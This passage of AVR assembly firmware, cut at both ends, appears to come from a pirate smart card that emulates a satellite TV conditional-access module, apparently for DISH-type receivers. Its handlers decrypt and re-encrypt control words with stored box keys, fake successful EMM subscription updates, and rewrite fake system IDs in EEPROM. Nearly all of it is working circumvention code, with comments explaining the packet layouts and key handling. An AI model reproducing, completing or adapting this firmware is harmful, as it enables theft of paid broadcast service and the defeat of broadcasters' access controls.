		add	ZL, r18	; add index into command table
		clr	r0
		adc	ZH, r0		; add carry
		lpm			; load byte from flash into R0
		cp	r15, r0		; does IRD command = comand in table ?
		breq	FoundCMD	; yes -> jump


		inc	r18		; inc index
		cpi	r18, (JmpTblEnd-JmpTable)	; at end of table ?
		brne	LookUpCMD	; No ->	compare	next command


		rjmp	BadCmd		; Didn't find IRD's command in our table

FoundCMD:				; ...
		ldi	ZL, low(JmpTable) ; address of JmpTable
		ldi	ZH, high(JmpTable) ; Z = 0x0192
		add	ZL, r18	; add index into JmpTable
		clr	r0
		adc	ZH, r0
		ijmp			; jump to table	entry


JmpTable:				; ...
		rjmp	CMD_03		; Command 03: Equipment	Control	Word
		rjmp	CMD_13		; Command 13: Control Word Request
		rjmp	CMD_00n01	; Command 00: Global EMM
		rjmp	CMD_00n01	; Command 01: PPV EMM
		rjmp	CMD_02		; Command 02: MECM data
		rjmp	CMD_C0		; Command C0: Status request
		rjmp	CMD_12		; Command 12: CAM ID request
		rjmp	CMD_14		; Command 14: Serial # request
		rjmp	CMD_20		; Command 20: Data available query
		rjmp	CMD_21		; Command 21: Data request
		rjmp	CMD_30
		rjmp	CMD_31
		rjmp	CMD_40
		rjmp	CMD_60
		rjmp	CMD_61		; Command 61: Marry IRD
		rjmp	CMD_C1		; Command C1: Status detail request
JmpTblEnd:		

JMP_INDEX:	.db 0x03,0x13		; Table of command numbers listed
		.db 0x00,0x01		; in same order as JmpTable
		.db 0x02,0xC0
		.db 0x12,0x14
		.db 0x20,0x21
		.db 0x30,0x31
		.db 0x40,0x60
		.db 0x61,0xC1
		
;-------------------------------------------------------------------------------------------------------------------

IRD_badP1P2:				; ...
		rjmp	Send_SW1x6E
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 03 (Equipment	Control	Word) handler
;
; Sample 03 packet and response:
;	    00 01 02 03	04 05 06 07 08 09 0a 0b	0c 0d 0e 0f
;			   ad ae af b0 b1 b2 b3	b4 b5 b6 b7
;21 40 3D ; A0 CA 00 00	37 03 35 01 01 10 31 05	A6 FC E0 82
;						---hash----
;	    10 11 12 13	14 15 16 17 18 19 1a 1b	1c 1d 1e 1f
;	    b8 b9 ba bb	bc bd be bf c0 c1 c2 c3	c4 c5 c6 c7
;	    B4 7E 7B 76	BD 92 A1 B6 FC B9 90 F4	DD E2 26 7C
;	    ---hash----	--------ep1------------	------ep2--
;			      ----------cw1----------	 --
;
;	    20 21 22 23	24 25 26 27 28 29 2a 2b	2c 2d 2e 2f
;	    c8 c9 ca cb	cc cd ce cf d0 d1 d2 d3	d4 d5 d6 d7
;	    9F 04 9D DA	47 D5 67 F2 2D B0 D5 F9	44 B0 BD A1
;	    ----ep2----	--------ep3------------	------ep4--
;	    -------cw2---------- tier- -timeif35--    -----pgm start
;
;	    30 31 32 33	34 35 36 37 38 39 3a 3b	3c 3d
;	    d8 d9 da db	dc dd de df e0 e1 e2 e3	e4 e5
;	    0C FF C8 85	13 DB 89 21 04 FA FF CE	05 06
;	    ----ep4----	--------ep5------------
;   timeif3D----- --nowtime--
;		  ----if3d---
;
;12 40 07 ; 83 03 B1 01	02 90 00 F7			      
;
;*****

CMD_03:					; ...
		lds	r18, sMB_7	; get SID from IRD (sMsgBuf)
		andi	r18, 0xFE	; clear	low bit


		ldi	XL, low(eFSID1) ; X = 0x0001
		ldi	XH, high(eFSID1)
		rcall	ReadEEP		; read eFID1 from EEPROM


		cp	r16, r18
		breq	C03_L1		; if the same then move	on
		rcall	Update_SID	; Update SID info

C03_L1:					; ...
		lds	r16, sMB_11	; Key select byte
		ldi	XH, high(sDKey0)
		ldi	XL, low(sDKey0) ; X = 0x014D	(sDKey0)
		sbrc	r16, 4		; skip for Key 0
		adiw	XL, (sDKey1-sDKey0) ; 9 = add offset to	(sDKey1)
		
		sts	sKeyPtH, XH	; (sKeyPt) = address of	Key (0 or 1)
		sts	sKeyPtL, XL


		ldi	YL, low(sMB_C03pkt1)	; Y = 0x00BC (encrypted	packet 1)
		ldi	YH, high(sMB_C03pkt1)

C03_L2:					; ...
		ld	r16, Y
		rcall	BitFlop
		st	Y+, r15
		cpi	YL, low(sMB_C03pkt4)	; only reverse the 1st three packets (there are	4 total)
		brcs	C03_L2


		ldi	r16, low(sMB_C03pkt1)	; set (sCryPtL)	to point to 1st	packet
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt1)
		sts	sCryPtH, r16
		rcall	DeCrypt_Proc


		ldi	r16, low(sMB_C03pkt2)	; set (sCryPtL)	to point to 2nd	packet
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt2)
		sts	sCryPtH, r16
		rcall	DeCrypt_Proc


		ldi	r16, low(sMB_C03pkt3)	; set (sCryPtL)	to point to 3rd	packet
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt3)
		sts	sCryPtH, r16
		rcall	DeCrypt_Proc


		sbrs	SID, 1		; skip if DISH
		rjmp	Cmd03_Ready	; if not dish just return control words	unencrypted


		lds	r18, sMB_7	; load IRDs SID
		andi	r18, 1		; say we are in	a Dishnet IRD


		ldi	XH, high(eCAMsID)
		ldi	XL, low(eCAMsID) ; X	= 0x0118 (eCAMsID)
		rcall	ReadEEP
		or	r16, r18
		sts	sMB_7, r16	; setup	SID from fake IRD (us)


		ldi	r16, 0x2F
		ldi	YL, low(sMB_4) ; Y =	0x00AC = 0x2F
		ldi	YH, high(sMB_4)
		st	Y, r16
		ldi	r16, 0x2D
		adiw	YL, 2
		st	Y+, r16		; 0x00AE = 0x2D
		ldi	r16, 0x29
		adiw	YL, 3
		st	Y+, r16		; 0x00B1 = 0x29
		ldi	r16, 7
		st	Y, r16		; 0x00B2 = 0x07


		ldi	r16, 0x24
		adiw	YL, 0x1C
		rcall	BitFlop
		st	Y+, r15		; 0x24 bit reversed


		ldi	r16, 1
		rcall	BitFlop
		st	Y, r15		; 0x01 bit reversed
		clr	r16
		adiw	YL, 5
		st	Y, r16
		ldi	r16, 5
		adiw	YL, 7
		st	Y, r16


		sbrc	SID, 3		; skip if married
		rcall	CAM_NotMarried


		ldi	YH, high(sMB_C03pkt1) ;	Y = 0x00BC
		ldi	YL, low(sMB_C03pkt1)

C03_L3:					; ...
		ld	r16, Y
		rcall	BitFlop
		st	Y+, r15
		cpi	YL, low(sMB_C03hash)
		brne	C03_L3		; bit flopped all of msg?


		ldi	r16, 0x35	; LEN =	0x35
		mov	LEN, r16


		rcall	TalkWithCAM	; Send to CAM, Get response


		clr	r16		; status flags = 00 00 06
		sts	Stat1, r16
		sts	Stat2, r16
		ldi	r16, 6
		sts	Stat3, r16


		rjmp	Send_SeqACK	; respond with sequence	number

		
;-------------------------------------------------------------------------------------------------------------------
;;;;;;;;;;;;;;;;
;
; This routine sets up the 03 packet encrypted data for	an NonMarried CAM.
;

CAM_NotMarried:				; ...
		ldi	XH, high(eHashKey)
		ldi	XL, low(eHashKey) ; X = 0x0110 (eHashKey)
		rcall	LoadKey


		ldi	r25, 4		; 4 packets
		ldi	XL, low(sMB_C03pkt1)
		ldi	XH, high(sMB_C03pkt1) ;	X = 0x00BC, start of packet 1

CUNM_L1:				; ...
		ldi	r16, 8		; count	= 8
		ldi	YL, low(sTemp) ; Y =	0x017C,	(sTemp)
		ldi	YH, high(sTemp)
		mov	ZL, XL	; Z = X
		mov	ZH, XH

CUNM_L2:				; ...
		ld	r17, Z+		; move R16 number bytes
		st	Y+, r17		; copy packet to temp buffer
		dec	r16
		brne	CUNM_L2


		sts	sCryPtL, XL	; (sCryPt) crypto buffer ptr = current packet in msgbuf
		sts	sCryPtH, XH


		push	XL		; save packet count and	X
		push	XH
		push	r25
		rcall	EnCrypt_Init	; encrypt packet with HashKey
		rcall	EnCrypt_ProcAlt
		pop	r25		; restore X & packet counter
		pop	XH
		pop	XL


		ldi	YL, low(sKeyBuff0) ;	Y = 0x0100 (sKeybuff)
		ldi	YH, high(sKeyBuff0)
		ldi	ZL, low(sTemp) ; Z =	0x017C (sTemp)
		ldi	ZH, high(sTemp)
		ldi	r18, 8		; count	= 8

; X -> currently en/decrypted packet
; Y -> Keybuff
; Z -> Orig Packet in Temp buff

CUNM_L3:				; ...
		ld	r16, X		; load en/decrypted byte
		ld	r17, Z+		; load orig byte
		eor	r16, r17
		st	Y+, r16		; save in keybuff
		st	X+, r17
		dec	r18
		brne	CUNM_L3


		dec	r25		; next packet
		breq	CUNM_L4


		rcall	PermuteKey
		rjmp	CUNM_L1

CUNM_L4:				; ...
		ldi	XL, low(sKeyBuff0) ;	X = 0x0100 (sKeyBuff)
		ldi	XH, high(sKeyBuff0)
		ldi	YL, low(sMB_12) ; Y = 0x00B4	(1st packet)
		ldi	YH, high(sMB_12)
		ldi	r18, 8		; 8 bytes

CUNM_L5:				; ...
		ld	r16, X+
		rcall	BitFlop
		st	Y+, r15
		dec	r18
		brne	CUNM_L5


		ldi	XH, high(sECAMPub) ; X = 0x016A	(sECAMPub)
		ldi	XL, low(sECAMPub)
		sts	sKeyPtH, XH	; (sKeyPt) = X
		sts	sKeyPtL, XL


		ldi	r16, low(sMB_C03pkt1) ; (sCryPt) crypto buffer ptr = 0x00BC
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt1)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc


		ldi	r16, low(sMB_C03pkt2)	; (sCryPt) crypto buffer ptr = 0x00C4
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt2)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc


		ldi	r16, low(sMB_C03pkt3)	; (sCryPt) crypto buffer ptr = 0x00CC
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt3)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc


		ldi	r16, low(sMB_C03pkt4)	; (sCryPt) crypto buffer ptr = 0x00D4
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C03pkt4)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc


		ldi	XH, high(eCAMsKey) ; X = 0x0119	(eCAMsKey) Cams	active key
		ldi	XL, low(eCAMsKey)
		rcall	ReadEEP
		sts	sMB_11,	r16


		ret
;
;

Cmd03_Ready:				; ...
		clr	r16		; Set status = 00 00 06
		sts	Stat1, r16
		sts	Stat2, r16
		ldi	r16, 6
		sts	Stat3, r16


		rjmp	Send_FlipSeqBit

		
;-------------------------------------------------------------------------------------------------------------------
;
; Send message to CAM - wait for response
;

TalkWithCAM:				; ...
		rcall	InitYbuf	; Y = start of msg buff
		clr	LRC		; clear	checksum
		eor	LRC, NAD	; checksum NAD
		eor	LRC, PCB	; checksum PCB
		eor	LRC, LEN	; checksum LEN


		mov	r18, LEN	; count	= LEN

TCckLp:					; ...
		tst	r18		; check	all bytes ?
		breq	TCtxHdr
		ld	r16, Y+		; load byte from msg buff
		eor	LRC, r16	; checksum byte
		dec	r18		; dec count
		rjmp	TCckLp		; loop all bytes

TCtxHdr:				; ...
		mov	r16, NAD	; NAD
		rcall	TX_CAM


		mov	r16, PCB	; PCB
		rcall	TX_CAM


		mov	r16, LEN	; LEN
		rcall	TX_CAM


		rcall	InitYbuf

TCtxMsg:				; ...
		tst	LEN
		breq	TCtxCks		; sent all of msg ?
		ld	r16, Y+
		rcall	TX_CAM		; send msg byte
		dec	LEN
		rjmp	TCtxMsg		; send all msg bytes

TCtxCks:				; ...
		mov	r16, LRC
		rcall	TX_CAM		; send	checksum


		rcall	RX_CAM		; NAD
		rcall	RX_CAM		; PCB


		rcall	RX_CAM		; LEN
		mov	LEN, r16
		tst	r16
		breq	TCrxCks		; any msg to RX	?


		mov	r18, LEN	; count	= LEN
		rcall	InitYbuf	; point	Y to msgbuf

TCrxMsg:				; ...
		rcall	RX_CAM		; read msg
		st	Y+, r16
		dec	r18
		brne	TCrxMsg		; load all msg bytes

TCrxCks:				; ...
		rcall	RX_CAM		; checksum
		mov	LRC, r16


		ret
; End of function TalkWithCAM

		
;-------------------------------------------------------------------------------------------------------------------
;
;*****
;
; Command 12 (CAM ID request) handler
;
;*****


CMD_12:					; ...
		ldi	XL, low(eCAMID1) ; X	= 0x0028 (eCAMID1)
		ldi	XH, high(eCAMID1)
		ldi	r16, 0x92	; response = 0x92
;
; Send a 4-byte	serial number pointed to by X, using the byte in R16 as
; the response type byte.  This	entry point is used by the handler for
; command 14.


CMD12_resp:				; ...
		sts	sMsgBuf, r16
		ldi	r16, 4
		sts	sMB_1, r16	; data LEN
		subi	r16, 0xFC	; Add 4
		mov	LEN, r16	; set LEN
		ldi	YL, low(sMB_2)  ; Y = 0x00AA (sMsgBuf+2)
		ldi	YH, high(sMB_2)

CMD12_RdEEP:				; ...
		rcall	ReadEEP
		st	Y+, r16
		cpi	YL, low(sMB_6)  ; ? YL = 0xAE(sMsgBuf+6), ie read 4 bytes
		brcs	CMD12_RdEEP

Send9000:				; ...
		ldi	r16, 0x90	; put 0x90 into	msgbuf
		st	Y+, r16
		clr	r16		; put 0x00 into	msgbuf
		st	Y+, r16
		rjmp	Respond
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 13 (Control Word Request) handler
;
;*****

CMD_13:					; ...
		sbrc	SID, 1		; Jump for dish	systems
		rjmp	C13_alt


		ldi	XH, high(sEBoxKey) ; X = 0x0144
		ldi	XL, low(sEBoxKey)  ; (sEBoxKey)
		sts	sKeyPtH, XH	; save in KeyPtrHi (sKeyPtH)
		sts	sKeyPtL, XL	; save in KeyPtrLo (sKeyPtL)


		ldi	r16, low(sMB_C13cw1) ; (sCryPt) = 0x00BE, "Control word 1"
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C13cw1)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc


		ldi	r16, low(sMB_C13cw2) ; (sCryPt) = 0x00CF, "Control word 2"
		sts	sCryPtL, r16
		ldi	r16, high(sMB_C13cw2)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc

;
;Response = 93 17 LEN B1 01 SEQ# 11 8 "control word 1" "control word 2"
;
		rcall	InitYbuf
		ldi	r16, 0x93
		st	Y+, r16
		ldi	r16, 0x17
		st	Y+, r16
		subi	r16, 0xFC	; add 4
		mov	LEN, r16
		ldi	r16, 0xB1
		st	Y+, r16
		ldi	r16, 1
		st	Y+, r16
		lds	r16, sSeqNum	; (sSeqNum)
		st	Y+, r16
		ldi	r16, 0x11
		st	Y+, r16
		ldi	r16, 8
		st	Y+, r16


		ldi	XL, low(sMB_C13cw1) ; X = 0x00BE
		ldi	XH, high(sMB_C13cw1)

C13_L1:					; ...
		ld	r16, X+
		rcall	BitFlop
		st	Y+, r15
		cpi	XL, low(sMB_C13cw1+8)
		brne	C13_L1


		ldi	r16, 0x12
		st	Y+, r16
		ldi	r16, 8
		st	Y+, r16


		ldi	XL, low(sMB_C13cw2) ; X = 0x00C7
		ldi	XH, high(sMB_C13cw2)

C13_L2:					; ...
		ld	r16, X+
		rcall	BitFlop
		st	Y+, r15
		cpi	XL, low(sMB_C13cw2+8)
		brne	C13_L2


		clr	r16		; Now that we've sent a control word,
		sts	Stat1, r16	; set our status to indicate "no
		sts	Stat3, r16	; control word waiting"
		ldi	r16, 4
		sts	Stat2, r16	; Status=00 04 00
		rjmp	Send9000	; And go send our response


; This is the portion of Cmd13 for dish	systems

C13_alt:				; ...
		rcall	TalkWithCAM	; request control words	from CAM


		sbrc	SID, 2		; if CAM married skip next call
		rcall	CAMbox2IRDbox


		clr	r16		; set status to	"no control word waiting"
		sts	Stat1, r16
		sts	Stat3, r16
		ldi	r16, 4
		sts	Stat2, r16	; Status=00 04 00
		rjmp	Respond


CAMbox2IRDbox:				; ...
		rcall	Cmd13_BitFlop


		ldi	XH, high(sDCAMbox) ; X = 0160 (sDCAMbox) CAMs box key
		ldi	XL, low(sDCAMbox)
		sts	sKeyPtH, XH	; (sKeyPt) -> (sDCAMbox)
		sts	sKeyPtL, XL


		ldi	r16, low(sMsgBuf+7) ; (sCryPt) -> 0x00AF (sMsgBuf) + 7
		sts	sCryPtL, r16
		ldi	r16, high(sMsgBuf+7)
		sts	sCryPtH, r16
		rcall	DeCrypt_Proc	; decrypt control word 1 from CAM using	CAMS box key


		ldi	r16, low(sMsgBuf+0x11) ; (sCryPt) -> 0x00B9	(sMsgBuf)
		sts	sCryPtL, r16
		ldi	r16, high(sMsgBuf+0x11)
		sts	sCryPtH, r16
		rcall	DeCrypt_Proc	; decrypt control word 2 from CAM using	CAMS box key


		ldi	XH, high(sEBoxKey)
		ldi	XL, low(sEBoxKey) ; X = 0x0144
		sts	sKeyPtH, XH
		sts	sKeyPtL, XL	; (sKeyPt) -> (sEBoxKey)


		ldi	r16, low(sMsgBuf+7)
		sts	sCryPtL, r16
		ldi	r16, high(sMsgBuf+7)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc	; encrypt control word 1 from CAM using	IRDs box key


		ldi	r16, low(sMsgBuf+0x11)
		sts	sCryPtL, r16
		ldi	r16, high(sMsgBuf+0x11)
		sts	sCryPtH, r16
		rcall	EnCrypt_Proc	; encrypt control word 2 from CAM using	IRDs box key


		ldi	r16, 27		; LEN
		mov	LEN, r16

Cmd13_BitFlop:				; ...
		ldi	YL, low(sMsgBuf+7); Y = 0x00AF
		ldi	YH, high(sMsgBuf+7)

C13BF_L1:				; ...
		ld	r16, Y
		rcall	BitFlop
		st	Y+, r15
		cpi	YL, low(sMsgBuf+0x19) ; bit flopped all the data ?
		brne	C13BF_L1	; bit flop the control words

		ret
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 14 (CAM internal data	request	 ??) handler
;
;*****


CMD_14:					; ...
		ldi	XL, low(eCMD14) ; X = 0x00CB	(eCMD14)
		ldi	XH, high(eCMD14)
		ldi	r16, 0x94	; SW1 =	0x94
		rjmp	CMD12_resp
;

BadCmnd:				; ...
		rjmp	BadCmd		; This provides	a way to get to	BADCMD with
					;  a branch instruction	instead	of an RJMP
					; 

;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 20 (Data Available Query) handler
;
;*****

CMD_20:					; ...
		lds	r16, sMB_7	; sMsgBuf + 7
		tst	r16
		breq	BadCmnd		; Requested item type=0?


		sbrc	r16, 7		; Item type < $80?
		rjmp	BadCmd		; If not, indicate bad command


		cpi	r16, 0xF	; Item type=$0F?
		breq	BadCmnd		; If not, indicate bad command


		andi	r16, 0x1F	; Else strip irrelevant	bits from item type 
					; to make it a legal value
		rcall	InitYbuf
		ldi	r17, 0xA0	; Response type=0xA0
		st	Y+, r17
		ldi	r17, 1		; Response data	length=01
		st	Y+, r17
		subi	r17, -4		; LEN=response data length+4
		mov	LEN, r17


		ldi	ZL, low(Cmd21_Nums *2) ; Point Z at table of # items we will want
		ldi	ZH, high(Cmd21_Nums *2); to return for a given	21/xx request
		add	ZL, r16	; Offset by item type being requested
		clr	r0
		adc	ZH, r0
		lpm			; Get #	of items to return
		st	Y+, r0
		rjmp	Send9000	; send response	with number of items

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 21 (Data Request) handler
;
;*****

CMD_21:					; ...
		lds	r16, sMB_7	; sMsgBuf + 7
		tst	r16
		breq	BadCmnd		; Item type=0?


		sbrc	r16, 7		; Item type<$80?
		rjmp	BadCmd		; If not, indicate bad command


		cpi	r16, 0xF	; Item type=$0F?
		breq	BadCmnd		; If so, indicate bad command
;
; NOTE:	This is	a bug in the XFILE code.  In theory, we	should be masking
;	 bits off of the data type here	so that	an out-of-bounds data type
;	 request will not result in garbage data being returned.

		ldi	XL, low(eCmd21) ; X = 0x00B3	(eCmd21)
		ldi	XH, high(eCmd21)
		lsl	r16		; mult Item type x 2
		add	XL, r16
		clr	r0
		adc	XH, r0		; X -> addr of item entry in EEPROM table
		rcall	ReadEEP		; read 1st byte	from table
		push	r16		; save on stack
		rcall	ReadEEP		; read 2nd byte	from table into	R16
		mov	XH, r16
		pop	XL		; X = addr from	EEPROM
		rcall	ReadEEP		; read byte from EEPROM	pointed	to by item entry table


		lds	r18, sMB_11	; Get element#	(index into item type array) being requested
		tst	r18
		breq	C21_L2		; if zero - then already have the correct element number


; EEPROM pointer += (element number x element length)

		clr	r0

C21_L1:					; ...
		add	XL, r16	; Add element data length to pointer
		adc	XH, r0		; to point to next element in item type
		dec	r18
		brne	C21_L1

C21_L2:					; ...
		rcall	InitYbuf
		ldi	r16, 0xA1	; Response type=0xA1
		st	Y+, r16
		lds	r16, sMB_12	; (sMsgBuf) Get	expected length	again
		subi	r16, 2		; Subtract 2 since expected length includes SW1:SW2
		mov	r18, r16	; count	= data len
		st	Y+, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16

C21_L3:					; ...
		rcall	ReadEEP		; read response	data from EEPROM
		st	Y+, r16		; and save in response buffer
		dec	r18
		brne	C21_L3		; transfer all the data


		rjmp	Send9000

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 30 = Request for callback encryption
;
; Respond by sending:
; 12 PCB 07 ; F0 03 B1 01 SEQ 90 00 CSUM
;
;*****

CMD_30:					; ...
		ldi	r16, 0xF0
		sts	sMsgBuf, r16
		rjmp	Send_SeqACK

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 31 = Request for callback data
;
;  Respond by sending:
;
; 12 PCB 54 ; F1 50 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 90 00 CSUM
;
;*****

CMD_31:					; ...
		ldi	r16, 0xF1
		sts	sMsgBuf, r16
		ldi	r16, 0x50
		sts	sMB_1, r16
		subi	r16, -4		; LEN =	data length + 4
		mov	LEN, r16


		ldi	r16, low(sMsgBuf+82)	; Last output buffer position we want to fill is 0xF9

;
; This entry point is used to fill the send buffer from	$AA to R16-1 with
; 00's.  It's called by the handler for command 60.

Cmd31_Alt:				; ...
		ldi	YL, low(sMsgBuf+2)	; Y = 0x00AA, sMsgBuf
		ldi	YH, high(sMsgBuf+2)
		clr	r15

C31_L1:					; ...
		st	Y+, r15
		cp	YL, r16
		brcs	C31_L1
		rjmp	Send9000

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 40 = EEPROM data space available request
;
; Respond by sending:
;
; 12 NAD 06 ; 70 02 00 00 90 00	CSUM
;
;*****

CMD_40:					; ...
		rcall	InitYbuf
		ldi	r16, 0x70	; Response type=0x70
		st	Y+, r16
		ldi	r16, 2		; Response length=02
		st	Y+, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16
		clr	r16
		st	Y+, r16		; Response data=00 00 "Our EEPROM is full" ;)
		st	Y+, r16
		rjmp	Send9000


		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 60 = Get IRD command
;
; Respond by sending:
;
; 12 PCB 44 ; E0 40 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 00 00 00 00	00 00 00 00 00 00 00 00	00 00
;	      00 00 90 00 CSUM
;
;*****

CMD_60:					; ...
		ldi	r16, 0xE0	; Response type=0xE0
		sts	sMsgBuf, r16
		ldi	r16, 0x40	; Response length= 0x40
		sts	sMB_1, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16
; MCG306 WAS
;		ldi	r16, low(sMsgBuf+66)	; Last output buffer location to fill with 00s is 0xE9
;		rjmp	Cmd31_Alt	; And go fill output buffer with zeros and then	send msg
; *****************************************************************************************
; MCG307 START CHANGES #4 *****************************************************************
; *****************************************************************************************
		ldi	XL, low(sTemp+10)
		ldi	XH, high(sTemp+10)	; Y -> signature bytes in msg

		ldi	YL,low(sMB_2)   ; 0x00AA
		ldi	YH,high(sMB_2)
		ldi	r18,0x40
loc_246:	ld	r16,x+
		st	y+,r16
		dec	r18
		brne	loc_246
		rjmp	Send9000
; *****************************************************************************************
; MCG307 CHANGES END #4
; *****************************************************************************************

;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 61 (Marry IRD) handler.  The IRD has sent us a message of the
; form:
;
; 21 PCB 1C ; A0 CA 00 00 16 61	14 aa bb cc dd xx xx xx	xx xx
;	      xx xx xx xx xx xx	xx xx xx xx xx 03 CSUM
;
; This message contains	"marriage" information about the IRD:
; ddccbbaa is the IRD serial number in hex, and	the xx's are
; miscellaneous	ASCII data containing things like the IRD's
; firmware version number.  We'll write this info into EEPROM
; so that we can return	it in response to a 21/01 command.  In
; addition, we send the	following response:
;
; 12 PCB 05 ; E1 01 00 90 00 CSUM
;
;*****

CMD_61:					; ...
		ldi	r18, 20		; 20 bytes of data
		ldi	YL, low(sMsgBuf+7) ; Point Y at the IRD marriage info
		clr	YH
		ldi	XH, high(eIRDrev) ; Point X at EEPROM storage (eIRDrev)
		ldi	XL, low(eIRDrev)

C61_L1:					; ...
		ld	r16, Y+		; get byte for msgbuf
		rcall	WriteEEP	; save it
		dec	r18
		brne	C61_L1


		rcall	InitYbuf
		ldi	r16, 0xE1	; Response type=0xE1
		st	Y+, r16
		ldi	r16, 1		; Response length=01
		st	Y+, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16
		clr	r16		; Response data=00
		st	Y+, r16
		rjmp	Send9000


		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command C0 (CAM Status Request) handler.  Respond by sending the 3
; status bytes we have stored at 72, 73, and 74	in a B0	response.
;
; Response message format:
;
; 12 PCB 08 ; B0 04 08 S1 S2 S3	90 00 CSUM
;
; Where	S1, S2,	and S3 are the status bytes we have stored at
; 72, 73, and 74, respectively.	 In addition, after sending this
; message, the "Suggest C0 request" bit is cleared
;
;*****

CMD_C0:					; ...
		rcall	InitYbuf
		ldi	r16, 0xB0	; Response type=0xB0
		st	Y+, r16
		ldi	r16, 4		; Response length=04
		st	Y+, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16
		ldi	r16, 8		; 1st response data byte=08
		st	Y+, r16


		lds	r16, Stat1	; Get S1
		st	Y+, r16
		andi	r16, 0xFD	; Strip	"Suggest C0 request" bit
		sts	Stat1, r16


		lds	r16, Stat2	; Get S2
		st	Y+, r16
		lds	r16, Stat3	; Get S3
		st	Y+, r16
		rjmp	Send9000

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command C1 (CAM Status Detail	Request) handler.  The IRD will	send us
; this message depending on the	data we	send back in response to a C0
; command.  This message contains a bitmap field that tells the	IRD which
; 21/xx	items it should	re-request.
;
; Response format:
;
; 12 PCB 06 ; B1 02 xx xx 90 00	CSUM
;
; Where	xx xx is the bitmapped field telling the IRD which 21/xx items
; should be re-queried (lsb=21/01, bit 1=21/02,	etc.)
;
; After	this message is	sent, the "Suggest C1 request" status bit is cleared
;
;*****
CMD_C1:					; ...
		lds	r16, Stat1	; Get S1
		andi	r16, 0xFE	; Clear	"Send C1 request" bit
		sts	Stat1, r16


		rcall	InitYbuf
		ldi	r16, 0xB1	; Response type=0xB1
		st	Y+, r16
		ldi	r16, 2		; Response length=02
		st	Y+, r16
		subi	r16, 0xFC	; LEN=data length+4
		mov	LEN, r16


		lds	r16, sC21_flag1	; Get 1st 21/xx	suggestion byte
		st	Y+, r16
		lds	r16, sC21_flag2	; Get 2nd 21/xx	suggestion byte
		st	Y+, r16


		clr	r16		; Clear	21/xx suggest bytes
		sts	sC21_flag1, r16
		sts	sC21_flag2, r16


		rjmp	Send9000

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 02 = MECM data handler
; 
;*****

CMD_02:					; ...
		ldi	XH, high(eCAMsID)
		ldi	XL, low(eCAMsID); X	= 0x0118 (eCAMsID)
		lds	r18, sMB_7	; get the SID from IRD msg
		andi	r18, 1		; isolate just "is it dish?"
		rcall	ReadEEP		; read cams SID
		or	r16, r18	; put CAMs SID and the IRDs SID	togetherr
		sts	sMB_7, r16	; save combined	SID


		sbrc	SID, 1		; if not a dish	system
		rcall	TalkWithCAM	; send msg to Cam and get response


		clr	r16
		sts	Stat1, r16	; clear	status word 1
		sts	Stat2, r16	; clear	status word 2
		ldi	r16, 0x40
		sts	Stat3, r16	; status word 3	= 0x40;	Cmd 02 complete
		rjmp	Send_SeqACK

		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Command 00/01	(EMM/PPV EMM) handler
; Basically, all we do here is set up our status bytes so that the next	C0
; command will look like we had	a successful update and	then send
; a 00/01/02/03	response to the	IRD.
; 
;*****

CMD_00n01:				; ...
		lds	r18, sMB_7	; get the SID from IRD msg
		andi	r18, 0xFE	; clear	bit 0
		ldi	XL, low(eFSID1)
		ldi	XH, high(eFSID1); X = 0x0001 (eFSID1)
		rcall	ReadEEP


		cp	r16, r18	; is our fake sys id the same as system	we're running on?
		breq	Send_Done0n1


		rcall	Update_SID	; update all the FID and SIDS


		rjmp	Send_Done0n1


		
;-------------------------------------------------------------------------------------------------------------------
;;;;;;;;;;;;;;;;;;;;
;
; On entry R18 = new SID
;
;;;;;;;;;;;;;;;;;;;;;

Update_SID:				; ...
		mov	r16, r18	; write	SID value
		ldi	XL, low(eFSID1)
		ldi	XH, high(eFSID1) ; X = 0x0001 (eFSID1)
		rcall	WriteEEP
		ldi	XL, low(eFSID2)
		ldi	XH, high(eFSID2) ; X = 0x0025, (eFSID2)
		rcall	WriteEEP


		ori	r16, 1		; set bit 0 = 1
		ldi	XL, low(eSID1)
		ldi	XH, high(eSID1)	; X = 0x0020 (eSID1)
		rcall	WriteEEP
		ldi	XL, low(eSIDs)
